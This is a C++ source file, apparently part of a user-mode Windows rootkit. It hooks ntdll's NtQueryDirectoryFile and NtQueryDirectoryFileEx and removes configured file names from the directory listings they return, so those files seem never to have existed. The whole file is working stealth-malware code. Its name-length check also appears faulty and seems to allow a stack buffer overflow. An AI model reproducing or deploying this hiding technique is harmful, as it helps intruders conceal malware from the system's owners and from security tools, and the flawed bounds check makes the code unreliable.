/*
 * hide_file.cpp - Hide configured files from directory enumeration.
 *
 * Hooks ntdll!NtQueryDirectoryFile and ntdll!NtQueryDirectoryFileEx
 * (the latter only exists on Windows 10 1703+; missing exports are
 * skipped). Matching entries are unlinked from the returned
 * FILE_*_INFORMATION chain; when the buffer ends up empty the call is
 * converted into STATUS_NO_MORE_FILES so FindFirstFile reports
 * ERROR_NO_MORE_FILES - exactly like a directory that never contained
 * the file.
 *
 * The name match uses the bare file name (no directory part), which is
 * what the FileName member carries in every information class.
 */
#include "rkhooks.h"
#include "api.h"
#include "../common/rknt.h"
#include "../common/hook.h"
#include "../common/config.h"

#include <string.h>
#include <stddef.h>

#define RK_DIR_NAME_MAX_CCH 260

typedef RK_pfn_NtQueryDirectoryFile   pfn_NtQDF;
typedef RK_pfn_NtQueryDirectoryFileEx pfn_NtQDFX;

static pfn_NtQDF     Real_NtQueryDirectoryFile   = NULL;
static pfn_NtQDFX    Real_NtQueryDirectoryFileEx = NULL;
static volatile LONG g_installed                 = 0;

/* Per-class offsets of FileName and the preceding FileNameLength. */
static int dir_class_offsets(ULONG cls, size_t *len_off, size_t *name_off)
{
    switch (cls)
    {
        case RK_FileDirectoryInformation:
            *len_off  = offsetof(RK_FILE_DIRECTORY_INFORMATION, FileNameLength);
            *name_off = offsetof(RK_FILE_DIRECTORY_INFORMATION, FileName);
            return 1;
        case RK_FileFullDirectoryInformation:
            *len_off  = offsetof(RK_FILE_FULL_DIR_INFORMATION, FileNameLength);
            *name_off = offsetof(RK_FILE_FULL_DIR_INFORMATION, FileName);
            return 1;
        case RK_FileBothDirectoryInformation:
            *len_off  = offsetof(RK_FILE_BOTH_DIR_INFORMATION, FileNameLength);
            *name_off = offsetof(RK_FILE_BOTH_DIR_INFORMATION, FileName);
            return 1;
        case RK_FileNamesInformation:
            *len_off  = offsetof(RK_FILE_NAMES_INFORMATION, FileNameLength);
            *name_off = offsetof(RK_FILE_NAMES_INFORMATION, FileName);
            return 1;
        case RK_FileIdFullDirectoryInformation:
            *len_off  = offsetof(RK_FILE_ID_FULL_DIR_INFORMATION, FileNameLength);
            *name_off = offsetof(RK_FILE_ID_FULL_DIR_INFORMATION, FileName);
            return 1;
        case RK_FileIdBothDirectoryInformation:
            *len_off  = offsetof(RK_FILE_ID_BOTH_DIR_INFORMATION, FileNameLength);
            *name_off = offsetof(RK_FILE_ID_BOTH_DIR_INFORMATION, FileName);
            return 1;
        default:
            return 0;
    }
}

static int file_matches(const rk_config *cfg, const wchar_t *name)
{
    int i;
    for (i = 0; i < cfg->file_count; ++i)
        if (rk_wcsw(cfg->files[i], name))
            return 1;
    return 0;
}

/*
 * Shared unlink walk. 'total' receives/consumes the byte count reported
 * in IoStatusBlock->Information. Returns 1 when the buffer became empty
 * (the caller must then report STATUS_NO_MORE_FILES).
 */
static int filter_dir(rk_config *cfg, void *buffer,
                      size_t len_off, size_t name_off, ULONG_PTR *total)
{
    unsigned char *cur  = (unsigned char *)buffer;
    unsigned char *prev = NULL;
    int            emptied = 0;

    while (cur)
    {
        ULONG          next_off = *(ULONG *)(void *)cur;
        unsigned char *next     = next_off ? cur + next_off : NULL;

        ULONG   name_len = *(ULONG *)(void *)(cur + len_off);
        wchar_t tmp[RK_DIR_NAME_MAX_CCH];
        int     hide = 0;

        if (name_len && name_len < sizeof(tmp) * 2 - sizeof(WCHAR))
        {
            size_t n = name_len / sizeof(WCHAR);
            memcpy(tmp, cur + name_off, n * sizeof(WCHAR));
            tmp[n] = 0;
            hide = file_matches(cfg, tmp);
        }

        if (hide)
        {
            if (prev)
            {
                ULONG *pn = (ULONG *)(void *)prev;
                if (next_off == 0)
                    *pn = 0;
                else
                    *pn += next_off;
                cur = next;
            }
            else if (!next)
            {
                /* The only entry in the buffer matched. */
                emptied = 1;
                break;
            }
            else if (*total >= next_off)
            {
                /* First entry: shift the remainder over it. */
                memmove(buffer, (char *)buffer + next_off, (size_t)(*total - next_off));
                *total -= next_off;
                cur  = (unsigned char *)buffer;
                prev = NULL;
            }
            else
            {
                /* Total length implausible: leave the entry visible. */
                cur = next;
            }
            continue;
        }

        prev = cur;
        cur  = next;
    }
    return emptied;
}

static NTSTATUS NTAPI Hooked_NtQueryDirectoryFile(
    HANDLE FileHandle, HANDLE Event, PVOID ApcRoutine, PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length,
    ULONG FileInformationClass, BOOLEAN ReturnSingleEntry,
    PUNICODE_STRING FileName, BOOLEAN RestartScan)
{
    NTSTATUS st = Real_NtQueryDirectoryFile(
        FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock,
        FileInformation, Length, FileInformationClass, ReturnSingleEntry,
        FileName, RestartScan);

    (void)Length; (void)ReturnSingleEntry; (void)FileName; (void)RestartScan;

    if (NT_SUCCESS(st) && FileInformation && IoStatusBlock && IoStatusBlock->Information)
    {
        size_t len_off, name_off;
        if (dir_class_offsets(FileInformationClass, &len_off, &name_off))
        {
            rk_config cfg;
            rk_config_snapshot(&cfg);
            if (cfg.file_count)
            {
                ULONG_PTR total = IoStatusBlock->Information;
                if (filter_dir(&cfg, FileInformation, len_off, name_off, &total))
                {
                    IoStatusBlock->Information = 0;
                    return STATUS_NO_MORE_FILES;
                }
                IoStatusBlock->Information = total;
            }
        }
    }
    return st;
}

static NTSTATUS NTAPI Hooked_NtQueryDirectoryFileEx(
    HANDLE FileHandle, HANDLE Event, PVOID ApcRoutine, PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length,
    ULONG FileInformationClass, ULONG QueryFlags, PUNICODE_STRING FileName)
{
    NTSTATUS st = Real_NtQueryDirectoryFileEx(
        FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock,
        FileInformation, Length, FileInformationClass, QueryFlags, FileName);

    (void)Length; (void)QueryFlags; (void)FileName;

    if (NT_SUCCESS(st) && FileInformation && IoStatusBlock && IoStatusBlock->Information)
    {
        size_t len_off, name_off;
        if (dir_class_offsets(FileInformationClass, &len_off, &name_off))
        {
            rk_config cfg;
            rk_config_snapshot(&cfg);
            if (cfg.file_count)
            {
                ULONG_PTR total = IoStatusBlock->Information;
                if (filter_dir(&cfg, FileInformation, len_off, name_off, &total))
                {
                    IoStatusBlock->Information = 0;
                    return STATUS_NO_MORE_FILES;
                }
                IoStatusBlock->Information = total;
            }
        }
    }
    return st;
}

extern "C" int rk_hide_file_install(void)
{
    void *orig;
    int   rc;
    void *t1 = rk_proc(L"ntdll.dll", "NtQueryDirectoryFile");
    void *t2 = rk_proc(L"ntdll.dll", "NtQueryDirectoryFileEx");

    if (InterlockedExchange(&g_installed, 1))
        return 0;

    if (!t1 && !t2)
    {
        g_installed = 0;
        return 1;
    }

    if (t1)
    {
        rc = rk_hook(t1, (void *)&Hooked_NtQueryDirectoryFile, &orig);
        if (rc != 0)
        {
            g_installed = 0;
            return rc;
        }
        Real_NtQueryDirectoryFile = (pfn_NtQDF)orig;
    }

    if (t2)
    {
        rc = rk_hook(t2, (void *)&Hooked_NtQueryDirectoryFileEx, &orig);
        if (rc != 0)
        {
            g_installed = 0;
            return rc;
        }
        Real_NtQueryDirectoryFileEx = (pfn_NtQDFX)orig;
    }

    return 0;
}
